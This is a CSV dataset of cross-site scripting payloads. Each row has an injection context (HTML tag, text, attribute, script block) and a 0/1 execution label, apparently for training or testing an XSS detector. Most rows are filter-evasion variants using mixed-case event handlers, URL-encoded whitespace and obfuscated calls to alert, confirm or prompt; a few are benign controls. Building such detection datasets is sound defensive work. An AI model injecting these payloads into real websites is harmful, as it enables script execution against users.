payload,context,exec,combined
<DETails%09onTOGGlE%09=%09confirm()%0dx//,html_tag,0,CONTEXT_html_tag <DETails%09onTOGGlE%09=%09confirm()%0dx//
<d3V%09OnmOusEOvER%0a=%0a(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%09OnmOusEOvER%0a=%0a(prompt)``%0dx>v3dm0s
<detAIls/+/onPoInteRenTeR%0a=%0a(confirm)()>,html_tag,0,CONTEXT_html_tag <detAIls/+/onPoInteRenTeR%0a=%0a(confirm)()>
<d3V%0donmOusEOVER%09=%09[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%0donmOusEOVER%09=%09[8].find(confirm)>v3dm0s
<d3v%09oNPoInTErEntEr%09=%09[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <d3v%09oNPoInTErEntEr%09=%09[8].find(confirm)>v3dm0s
<A%0aONpoINtErenter%09=%09(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0aONpoINtErenter%09=%09(confirm)()>v3dm0s
<HtML%0aOnPOInTeReNter%0d=%0d(prompt)``>,html_tag,0,CONTEXT_html_tag <HtML%0aOnPOInTeReNter%0d=%0d(prompt)``>
3136783421,html_text,0,CONTEXT_html_text 3136783421
<HTmL%09oNpointErEnTeR%0a=%0aconfirm()//,html_text,0,CONTEXT_html_text <HTmL%09oNpointErEnTeR%0a=%0aconfirm()//
<HTMl%0aOnpoINTereNtEr%0d=%0d(prompt)``%0dx//,html_text,0,CONTEXT_html_text <HTMl%0aOnpoINTereNtEr%0d=%0d(prompt)``%0dx//
<a%09ONmoUseovEr%09=%09confirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <a%09ONmoUseovEr%09=%09confirm()>v3dm0s
<HtMl/+/oNPoinTerEnteR%0d=%0dconfirm()%0dx>,html_tag,0,CONTEXT_html_tag <HtMl/+/oNPoinTerEnteR%0d=%0dconfirm()%0dx>
<D3V/+/onpoiNteRENteR%0d=%0dconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <D3V/+/onpoiNteRENteR%0d=%0dconfirm()>v3dm0s
""" onkeyup=alert(1) """,html_tag,0,"CONTEXT_html_tag "" onkeyup=alert(1) """
<dEtails%0doNtogGle%0d=%0d(prompt)``%0dx>,html_tag,0,CONTEXT_html_tag <dEtails%0doNtogGle%0d=%0d(prompt)``%0dx>
<hTMl%0doNpoINtErentER+=+(prompt)``%0dx//,html_text,0,CONTEXT_html_text <hTMl%0doNpoINtErentER+=+(prompt)``%0dx//
"<a%0dONPoInTeREntER%0d=%0da=prompt,a()>v3dm0s",html_tag,1,"CONTEXT_html_tag <a%0dONPoInTeREntER%0d=%0da=prompt,a()>v3dm0s"
"<d3V%09oNpoiNTerENTER%09=%09a=prompt,a()>v3dm0s",html_text,1,"CONTEXT_html_text <d3V%09oNpoiNTerENTER%09=%09a=prompt,a()>v3dm0s"
<hTml%09OnmoUsEoveR%0d=%0d(confirm)()%0dx>,html_text,0,CONTEXT_html_text <hTml%09OnmoUsEoveR%0d=%0d(confirm)()%0dx>
<d3V%0dOnMOUsEoVeR%0a=%0a(confirm)()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3V%0dOnMOUsEoVeR%0a=%0a(confirm)()%0dx>v3dm0s
<HTML%09onMOUSeOVeR%09=%09confirm()%0dx>,html_text,0,CONTEXT_html_text <HTML%09onMOUSeOVeR%09=%09confirm()%0dx>
<d3V%0aOnpOINTerEnTeR%0a=%0a[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%0aOnpOINTerEnTeR%0a=%0a[8].find(confirm)>v3dm0s
<HTMl%0donmousEoVER%0a=%0aconfirm()%0dx//,html_text,0,CONTEXT_html_text <HTMl%0donmousEoVER%0a=%0aconfirm()%0dx//
<DETaIls%0aoNpoinTerENTEr%09=%09(prompt)``//,html_tag,0,CONTEXT_html_tag <DETaIls%0aoNpoinTerENTEr%09=%09(prompt)``//
<d3V/+/OnPOintERenTeR%0d=%0dconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V/+/OnPOintERenTeR%0d=%0dconfirm()>v3dm0s
<d3V%0donpOINteRenteR%09=%09confirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%0donpOINteRenteR%09=%09confirm()%0dx>v3dm0s
"<dEtAils%09onPoINtEREnTer%0d=%0da=prompt,a()//",html_tag,0,"CONTEXT_html_tag <dEtAils%09onPoINtEREnTer%0d=%0da=prompt,a()//"
<A%0aonMousEoVEr%09=%09confirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0aonMousEoVEr%09=%09confirm()>v3dm0s
"<detAILs%0aontOGgle+=+a=prompt,a()%0dx//",html_tag,0,"CONTEXT_html_tag <detAILs%0aontOGgle+=+a=prompt,a()%0dx//"
<dEtAIls/+/OnpOIntereNTer%0a=%0aconfirm()//,html_tag,0,CONTEXT_html_tag <dEtAIls/+/OnpOIntereNTer%0a=%0aconfirm()//
<DeTAIls%0doNToGglE%0a=%0aconfirm()%0dx//,html_tag,0,CONTEXT_html_tag <DeTAIls%0doNToGglE%0a=%0aconfirm()%0dx//
"<hTML/+/oNMOuSeoveR%09=%09a=prompt,a()//",html_tag,0,"CONTEXT_html_tag <hTML/+/oNMOuSeoveR%09=%09a=prompt,a()//"
<DEtAilS%0aOnTOGGLE%0a=%0a(confirm)()//,html_tag,0,CONTEXT_html_tag <DEtAilS%0aOnTOGGLE%0a=%0a(confirm)()//
<a/+/OnmousEOVer%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a/+/OnmousEOVer%0a=%0a[8].find(confirm)%0dx>v3dm0s
<a%0dOnpointerenTEr%0d=%0d(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0dOnpointerenTEr%0d=%0d(prompt)``%0dx>v3dm0s
<Html/+/oNPoInteREnter%0d=%0d(confirm)()>,html_tag,0,CONTEXT_html_tag <Html/+/oNPoInteREnter%0d=%0d(confirm)()>
""" onpointerover=alert(1) """,html_attribute,1,"CONTEXT_html_attribute "" onpointerover=alert(1) """
""";alert(document.domain);//",script_block,1,"CONTEXT_script_block "";alert(document.domain);//"
<img src=x onerror=alert(1)//,html_text,0,CONTEXT_html_text <img src=x onerror=alert(1)//
<d3v/+/OnPOIntErEntER%0a=%0a[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v/+/OnPOIntErEntER%0a=%0a[8].find(confirm)>v3dm0s
<a%09OnMoUSeOver%0a=%0a(prompt)``>v3dm0s,html_tag,1,CONTEXT_html_tag <a%09OnMoUSeOver%0a=%0a(prompt)``>v3dm0s
"<dEtAILs%0dONToGgle+=+a=prompt,a()%0dx>",html_tag,0,"CONTEXT_html_tag <dEtAILs%0dONToGgle+=+a=prompt,a()%0dx>"
<hTMl%0aOnmOuSeOvEr%09=%09[8].find(confirm)%0dx>,html_text,0,CONTEXT_html_text <hTMl%0aOnmOuSeOvEr%09=%09[8].find(confirm)%0dx>
<D3v/+/OnpoINteRenTer%09=%09(confirm)()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v/+/OnpoINteRenTer%09=%09(confirm)()%0dx>v3dm0s
<a%0aoNmOuSeoVER%09=%09[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0aoNmOuSeoVER%09=%09[8].find(confirm)%0dx>v3dm0s
<D3v%0dOnMOUSEOVER%09=%09(confirm)()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%0dOnMOUSEOVER%09=%09(confirm)()%0dx>v3dm0s
<d3v%0aonmOusEOVEr%0d=%0d[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v%0aonmOusEOVEr%0d=%0d[8].find(confirm)>v3dm0s
<DetAIlS/+/OnTogGle%09=%09[8].find(confirm)>,html_text,0,CONTEXT_html_text <DetAIlS/+/OnTogGle%09=%09[8].find(confirm)>
<D3v%0aOnpOInterEnTer%09=%09(confirm)()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3v%0aOnpOInterEnTer%09=%09(confirm)()%0dx>v3dm0s
<A%0dOnPoINtErenTer+=+confirm()>v3dm0s,html_tag,0,CONTEXT_html_tag <A%0dOnPoINtErenTer+=+confirm()>v3dm0s
<htML%0doNpoiNTErENTer+=+(prompt)``%0dx>,html_tag,0,CONTEXT_html_tag <htML%0doNpoiNTErENTer+=+(prompt)``%0dx>
"<D3v%09onMOUSeovER+=+a=prompt,a()%0dx>v3dm0s",html_text,0,"CONTEXT_html_text <D3v%09onMOUSeovER+=+a=prompt,a()%0dx>v3dm0s"
<D3v%0aonmOUSeOvER%0a=%0a(prompt)``>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%0aonmOUSeOvER%0a=%0a(prompt)``>v3dm0s
<dEtAilS%09ONpointeREnTer%0d=%0d(prompt)``%0dx//,html_tag,0,CONTEXT_html_tag <dEtAilS%09ONpointeREnTer%0d=%0d(prompt)``%0dx//
<Html%0dOnPOINTerENTER%09=%09confirm()//,html_text,0,CONTEXT_html_text <Html%0dOnPOINTerENTER%09=%09confirm()//
<htmL%0aonMouSEOVer%0a=%0a(confirm)()>,html_tag,0,CONTEXT_html_tag <htmL%0aonMouSEOVer%0a=%0a(confirm)()>
"<d3V%09oNpoINtErEntEr%0a=%0aa=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <d3V%09oNpoINtErEntEr%0a=%0aa=prompt,a()%0dx>v3dm0s"
<html/+/ONMouSEovEr%0d=%0d[8].find(confirm)%0dx//,html_tag,0,CONTEXT_html_tag <html/+/ONMouSEovEr%0d=%0d[8].find(confirm)%0dx//
<a/+/oNmoUSeovER%09=%09confirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <a/+/oNmoUSeovER%09=%09confirm()>v3dm0s
<A/+/onMOuSEOVER%09=%09[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A/+/onMOuSEOVER%09=%09[8].find(confirm)%0dx>v3dm0s
<D3V%0aoNMOuSEOvEr%09=%09(prompt)``>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V%0aoNMOuSEOvEr%09=%09(prompt)``>v3dm0s
<A/+/ONmOUseOVEr%0a=%0a(prompt)``>v3dm0s,html_tag,1,CONTEXT_html_tag <A/+/ONmOUseOVEr%0a=%0a(prompt)``>v3dm0s
<dEtailS/+/onpoInTeReNteR%0d=%0d[8].find(confirm)%0dx//,html_tag,0,CONTEXT_html_tag <dEtailS/+/onpoInTeReNteR%0d=%0d[8].find(confirm)%0dx//
<A/+/onPOinteReNTer%09=%09[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A/+/onPOinteReNTer%09=%09[8].find(confirm)%0dx>v3dm0s
"<deTAiLs%0aonPOiNterENTEr%0a=%0aa=prompt,a()%0dx//",html_tag,0,"CONTEXT_html_tag <deTAiLs%0aonPOiNterENTEr%0a=%0aa=prompt,a()%0dx//"
<A/+/oNMOuseOVer+=+confirm()>v3dm0s,html_tag,0,CONTEXT_html_tag <A/+/oNMOuseOVer+=+confirm()>v3dm0s
<hTML%0aOnPOInteRENteR%0a=%0a(prompt)``>,html_tag,0,CONTEXT_html_tag <hTML%0aOnPOInteRENteR%0a=%0a(prompt)``>
"<htMl/+/onpoINTEREntEr%0a=%0aa=prompt,a()%0dx>",url_navigation,0,"CONTEXT_url_navigation <htMl/+/onpoINTEREntEr%0a=%0aa=prompt,a()%0dx>"
<detaiLs%0aOnpOInterEntEr%0d=%0dconfirm()//,html_tag,0,CONTEXT_html_tag <detaiLs%0aOnpOInterEntEr%0d=%0dconfirm()//
"<htMl%0dOnMOusEOver%0a=%0aa=prompt,a()%0dx>",html_tag,0,"CONTEXT_html_tag <htMl%0dOnMOusEOver%0a=%0aa=prompt,a()%0dx>"
"<HTMl%0dOnpoiNTErenTeR%0d=%0da=prompt,a()//",html_tag,0,"CONTEXT_html_tag <HTMl%0dOnpoiNTErenTeR%0d=%0da=prompt,a()//"
<A%0dONpoInTErEnTER+=+[8].find(confirm)>v3dm0s,html_tag,0,CONTEXT_html_tag <A%0dONpoInTErEnTER+=+[8].find(confirm)>v3dm0s
<HtMl/+/OnpOinTerENtER%0d=%0dconfirm()>,html_tag,0,CONTEXT_html_tag <HtMl/+/OnpOinTerENtER%0d=%0dconfirm()>
"<d3V/+/onmOUsEoVer%0a=%0aa=prompt,a()>v3dm0s",html_tag,1,"CONTEXT_html_tag <d3V/+/onmOUsEoVer%0a=%0aa=prompt,a()>v3dm0s"
<a%0aoNPOiNtereNteR%0d=%0d(prompt)``>v3dm0s,html_tag,1,CONTEXT_html_tag <a%0aoNPOiNtereNteR%0d=%0d(prompt)``>v3dm0s
<d3v%0doNPoiNTeREnTER%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v%0doNPoiNTeREnTER%0a=%0a[8].find(confirm)%0dx>v3dm0s
<A/+/ONmouSEOvEr%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A/+/ONmouSEOvEr%0a=%0a[8].find(confirm)%0dx>v3dm0s
<d3V/+/oNmOuSEOver%09=%09confirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V/+/oNmOuSEOver%09=%09confirm()>v3dm0s
<a%09oNpoINteRenTEr+=+confirm()%0dx>v3dm0s,html_tag,0,CONTEXT_html_tag <a%09oNpoINteRenTEr+=+confirm()%0dx>v3dm0s
<D3V%0dOnPOInterENtER%09=%09(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <D3V%0dOnPOInterENtER%09=%09(confirm)()>v3dm0s
<DeTailS%09ONtoggLE+=+(prompt)``//,html_text,0,CONTEXT_html_text <DeTailS%09ONtoggLE+=+(prompt)``//
<svg OnLoAd=alert(1)>,html_text,0,CONTEXT_html_text <svg OnLoAd=alert(1)>
<d3v%0dONMouSEOVEr%0d=%0d(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <d3v%0dONMouSEOVEr%0d=%0d(confirm)()>v3dm0s
<d3v%0aoNMOusEover%09=%09(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3v%0aoNMOusEover%09=%09(prompt)``%0dx>v3dm0s
<dETaiLS/+/OnPOinteReNter+=+confirm()%0dx//,html_text,0,CONTEXT_html_text <dETaiLS/+/OnPOinteReNter+=+confirm()%0dx//
test@example.com,html_text,0,CONTEXT_html_text test@example.com
"<a%0dONMOUSeOVEr%0a=%0aa=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <a%0dONMOUSeOVEr%0a=%0aa=prompt,a()%0dx>v3dm0s"
"<d3v/+/oNPointeREnter%09=%09a=prompt,a()>v3dm0s",html_text,1,"CONTEXT_html_text <d3v/+/oNPointeREnter%09=%09a=prompt,a()>v3dm0s"
<A%0aONmoUSEOVER%09=%09(confirm)()>v3dm0s,html_tag,1,CONTEXT_html_tag <A%0aONmoUSEOVER%09=%09(confirm)()>v3dm0s
"<D3v%09ONPoiNteRENTEr%0d=%0da=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <D3v%09ONPoiNteRENTEr%0d=%0da=prompt,a()%0dx>v3dm0s"
<D3v%0dONPoInTeRENtEr+=+confirm()%0dx>v3dm0s,html_tag,0,CONTEXT_html_tag <D3v%0dONPoInTeRENtEr+=+confirm()%0dx>v3dm0s
"<D3v%0doNmOUSeOVeR%0a=%0aa=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <D3v%0doNmOUSeOVeR%0a=%0aa=prompt,a()%0dx>v3dm0s"
"<A%09OnmOUSEOver%0d=%0da=prompt,a()>v3dm0s",html_tag,1,"CONTEXT_html_tag <A%09OnmOUSEOver%0d=%0da=prompt,a()>v3dm0s"
<a/+/OnpoinTeREnTer%0d=%0dconfirm()%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <a/+/OnpoinTeREnTer%0d=%0dconfirm()%0dx>v3dm0s
"<hTMl%0dONmOuSEOveR+=+a=prompt,a()>",html_text,0,"CONTEXT_html_text <hTMl%0dONmOuSEOveR+=+a=prompt,a()>"
onload=run,html_text,0,CONTEXT_html_text onload=run
<a%09OnMoUSEoVeR%09=%09(confirm)()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a%09OnMoUSEoVeR%09=%09(confirm)()%0dx>v3dm0s
<d3v%0doNPoinTeRentER%0a=%0a(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3v%0doNPoinTeRentER%0a=%0a(prompt)``%0dx>v3dm0s
<hTml/+/ONMOuSeover%0a=%0a[8].find(confirm)%0dx//,html_text,0,CONTEXT_html_text <hTml/+/ONMOuSeover%0a=%0a[8].find(confirm)%0dx//
<htMl%0dOnMoUSEOvEr%0a=%0a(prompt)``%0dx//,html_tag,0,CONTEXT_html_tag <htMl%0dOnMoUSEOvEr%0a=%0a(prompt)``%0dx//
"<D3v%09oNPOinTEREnTER%0d=%0da=prompt,a()>v3dm0s",html_tag,1,"CONTEXT_html_tag <D3v%09oNPOinTEREnTER%0d=%0da=prompt,a()>v3dm0s"
<HTml%0aonMouseoVEr%09=%09[8].find(confirm)%0dx//,html_text,0,CONTEXT_html_text <HTml%0aonMouseoVEr%09=%09[8].find(confirm)%0dx//
<a%0aONpOinTEreNTer+=+(prompt)``%0dx>v3dm0s,html_tag,0,CONTEXT_html_tag <a%0aONpOinTEreNTer+=+(prompt)``%0dx>v3dm0s
<d3V%0donpoINtErentEr%09=%09(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <d3V%0donpoINtErentEr%09=%09(confirm)()>v3dm0s
<A%0aoNmouseOvER%09=%09[8].find(confirm)>v3dm0s,html_text,1,CONTEXT_html_text <A%0aoNmouseOvER%09=%09[8].find(confirm)>v3dm0s
<D3v%09OnPoINTErEntEr%09=%09confirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%09OnPoINTErEntEr%09=%09confirm()>v3dm0s
<D3v/+/onmoUseovEr+=+(prompt)``>v3dm0s,html_text,0,CONTEXT_html_text <D3v/+/onmoUseovEr+=+(prompt)``>v3dm0s
<D3v%09onpoInTerEnTer%0d=%0dconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <D3v%09onpoInTerEnTer%0d=%0dconfirm()>v3dm0s
<D3v%0aONpOInTeREnTER%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%0aONpOInTeREnTER%0a=%0a[8].find(confirm)%0dx>v3dm0s
<DeTAILS%0doNTOGgle%09=%09confirm()%0dx>,html_text,0,CONTEXT_html_text <DeTAILS%0doNTOGgle%09=%09confirm()%0dx>
<D3V%0donmoUSeovEr%0d=%0d(prompt)``>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V%0donmoUSeovEr%0d=%0d(prompt)``>v3dm0s
"<d3V%0doNPOInTerEnter%0a=%0aa=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <d3V%0doNPOInTerEnter%0a=%0aa=prompt,a()%0dx>v3dm0s"
<HtMl/+/oNPointeReNTER%0d=%0d(prompt)``//,html_text,0,CONTEXT_html_text <HtMl/+/oNPointeReNTER%0d=%0d(prompt)``//
<d3V%09oNMOuseoveR%09=%09(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <d3V%09oNMOuseoveR%09=%09(prompt)``%0dx>v3dm0s
<body>,html_tag,0,CONTEXT_html_tag <body>
<htmL/+/onmouSEoVeR%09=%09[8].find(confirm)%0dx>,html_text,0,CONTEXT_html_text <htmL/+/onmouSEoVeR%09=%09[8].find(confirm)%0dx>
<HTMl%09oNmouSeOVEr+=+(confirm)()%0dx//,html_text,0,CONTEXT_html_text <HTMl%09oNmouSeOVEr+=+(confirm)()%0dx//
<dEtaILS%0aoNPoiNtEReNTEr+=+confirm()%0dx>,html_tag,0,CONTEXT_html_tag <dEtaILS%0aoNPoiNtEReNTEr+=+confirm()%0dx>
<a%09onPoINTEreNTer+=+[8].find(confirm)>v3dm0s,html_text,0,CONTEXT_html_text <a%09onPoINTEreNTer+=+[8].find(confirm)>v3dm0s
"<d3v/+/OnMoUSEOvER%0d=%0da=prompt,a()%0dx>v3dm0s",html_text,1,"CONTEXT_html_text <d3v/+/OnMoUSEOvER%0d=%0da=prompt,a()%0dx>v3dm0s"
<d3V%0dOnPOIntEREntER%0d=%0dconfirm()>v3dm0s,html_text,1,CONTEXT_html_text <d3V%0dOnPOIntEREntER%0d=%0dconfirm()>v3dm0s
<D3v/+/OnmOUseovER%09=%09[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3v/+/OnmOUseovER%09=%09[8].find(confirm)%0dx>v3dm0s
<deTailS%09ONTOggLe%09=%09(prompt)``>,html_tag,0,CONTEXT_html_tag <deTailS%09ONTOggLe%09=%09(prompt)``>
<A/+/OnmOUSeOvEr%0d=%0d(prompt)``%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A/+/OnmOUSeOvEr%0d=%0d(prompt)``%0dx>v3dm0s
<DetailS%09ONtOGGLe+=+confirm()//,html_text,0,CONTEXT_html_text <DetailS%09ONtOGGLe+=+confirm()//
<D3v/+/ONMoUsEOver%0d=%0d[8].find(confirm)%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v/+/ONMoUsEOver%0d=%0d[8].find(confirm)%0dx>v3dm0s
<d3V%09OnpOinTeRenter%0a=%0aconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <d3V%09OnpOinTeRenter%0a=%0aconfirm()%0dx>v3dm0s
<D3V%0aOnMOuSeOVEr%09=%09(confirm)()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3V%0aOnMOuSeOVEr%09=%09(confirm)()%0dx>v3dm0s
<d3v%0aONpoInteRENtER%0d=%0d(confirm)()>v3dm0s,html_text,1,CONTEXT_html_text <d3v%0aONpoInteRENtER%0d=%0d(confirm)()>v3dm0s
"<A%09OnpOINTeReNTER%0a=%0aa=prompt,a()>v3dm0s",html_tag,1,"CONTEXT_html_tag <A%09OnpOINTeReNTER%0a=%0aa=prompt,a()>v3dm0s"
<D3v/+/ONMOUseoveR%09=%09(prompt)``%0dx>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v/+/ONMOUseoveR%09=%09(prompt)``%0dx>v3dm0s
<htMl%0aoNPoINtErENter+=+(prompt)``%0dx>,html_tag,0,CONTEXT_html_tag <htMl%0aoNPoINtErENter+=+(prompt)``%0dx>
<D3v%0aOnmouseoVer%0d=%0dconfirm()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <D3v%0aOnmouseoVer%0d=%0dconfirm()%0dx>v3dm0s
<a/+/OnPOINteRENtEr%0a=%0a(confirm)()%0dx>v3dm0s,html_text,1,CONTEXT_html_text <a/+/OnPOINteRENtEr%0a=%0a(confirm)()%0dx>v3dm0s
<D3V%0aONpoiNTErENTEr%0d=%0dconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <D3V%0aONpoiNTErENTEr%0d=%0dconfirm()>v3dm0s
<dETaiLS%0dONpoiNTEreNTeR%0d=%0dconfirm()>,html_tag,0,CONTEXT_html_tag <dETaiLS%0dONpoiNTEreNTeR%0d=%0dconfirm()>
"<D3V%0aonpOINTEreNTEr%09=%09a=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <D3V%0aonpOINTEreNTEr%09=%09a=prompt,a()%0dx>v3dm0s"
<D3v%09ONPoiNTeRenter+=+(prompt)``>v3dm0s,html_tag,0,CONTEXT_html_tag <D3v%09ONPoiNTeRenter+=+(prompt)``>v3dm0s
<HTml%09onMouseOver+=+(prompt)``%0dx//,html_text,0,CONTEXT_html_text <HTml%09onMouseOver+=+(prompt)``%0dx//
<HtML%09OnmouseOVER%0a=%0aconfirm()%0dx>,script_block,0,CONTEXT_script_block <HtML%09OnmouseOVER%0a=%0aconfirm()%0dx>
<D3v%0dONPOiNtErENTer%0a=%0aconfirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <D3v%0dONPOiNtErENTer%0a=%0aconfirm()>v3dm0s
<DEtaIlS%0aOntoGglE+=+[8].find(confirm)%0dx>,html_tag,0,CONTEXT_html_tag <DEtaIlS%0aOntoGglE+=+[8].find(confirm)%0dx>
<DEtAIls%0aOnPOInTErEnteR%0a=%0aconfirm()%0dx//,html_tag,0,CONTEXT_html_tag <DEtAIls%0aOnPOInTErEnteR%0a=%0aconfirm()%0dx//
<hTmL/+/oNmouseoVer%09=%09[8].find(confirm)%0dx//,html_text,0,CONTEXT_html_text <hTmL/+/oNmouseoVer%09=%09[8].find(confirm)%0dx//
javascript:alert(String.fromCharCode(49)),html_tag,0,CONTEXT_html_tag javascript:alert(String.fromCharCode(49))
<A%0dOnmouSeOvER%0a=%0a[8].find(confirm)%0dx>v3dm0s,html_text,1,CONTEXT_html_text <A%0dOnmouSeOvER%0a=%0a[8].find(confirm)%0dx>v3dm0s
<d3V/+/onpOINTEreNter+=+confirm()%0dx>v3dm0s,html_text,0,CONTEXT_html_text <d3V/+/onpOINTEreNter+=+confirm()%0dx>v3dm0s
"<deTAILS/+/onPOintEREnter+=+a=prompt,a()>",html_text,0,"CONTEXT_html_text <deTAILS/+/onPOintEREnter+=+a=prompt,a()>"
<DEtailS%09oNpOINTerEnter%0d=%0d(confirm)()>,html_tag,0,CONTEXT_html_tag <DEtailS%09oNpOINTerEnter%0d=%0d(confirm)()>
<HtmL%0aonpoINTeREntER%09=%09[8].find(confirm)%0dx//,html_tag,0,CONTEXT_html_tag <HtmL%0aonpoINTeREntER%09=%09[8].find(confirm)%0dx//
<d3v%09oNPoInTErEntEr%09=%09[8].find(confirm)>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v%09oNPoInTErEntEr%09=%09[8].find(confirm)>v3dm0s
<HTMl%09oNmouSeOVEr+=+(confirm)()%0dx//,html_tag,0,CONTEXT_html_tag <HTMl%09oNmouSeOVEr+=+(confirm)()%0dx//
<D3V%09onmouseOvER%0a=%0a(prompt)``>v3dm0s,html_text,1,CONTEXT_html_text <D3V%09onmouseOvER%0a=%0a(prompt)``>v3dm0s
<HtmL%0aonmOuseOVer%0a=%0aconfirm()//,html_tag,0,CONTEXT_html_tag <HtmL%0aonmOuseOVer%0a=%0aconfirm()//
<iframe src=>,html_text,0,CONTEXT_html_text <iframe src=>
<HTMl%0dOnmoUsEover%0a=%0aconfirm()%0dx//,html_tag,0,CONTEXT_html_tag <HTMl%0dOnmoUsEover%0a=%0aconfirm()%0dx//
<d3v%09onmOUSeoveR%09=%09confirm()>v3dm0s,html_tag,1,CONTEXT_html_tag <d3v%09onmOUSeoveR%09=%09confirm()>v3dm0s
"<A%0aoNMoUsEoVER%09=%09a=prompt,a()%0dx>v3dm0s",html_tag,1,"CONTEXT_html_tag <A%0aoNMoUsEoVER%09=%09a=prompt,a()%0dx>v3dm0s"
"<D3V%0doNMoUSEOveR+=+a=prompt,a()>v3dm0s",html_tag,0,"CONTEXT_html_tag <D3V%0doNMoUSEOveR+=+a=prompt,a()>v3dm0s"
"<dETAils%0dontOGGle%09=%09a=prompt,a()//",html_tag,0,"CONTEXT_html_tag <dETAils%0dontOGGle%09=%09a=prompt,a()//"
<A%09ONmOUSEovER+=+confirm()>v3dm0s,html_tag,0,CONTEXT_html_tag <A%09ONmOUSEovER+=+confirm()>v3dm0s
<D3v%0aONmOusEover+=+(confirm)()>v3dm0s,html_tag,0,CONTEXT_html_tag <D3v%0aONmOusEover+=+(confirm)()>v3dm0s
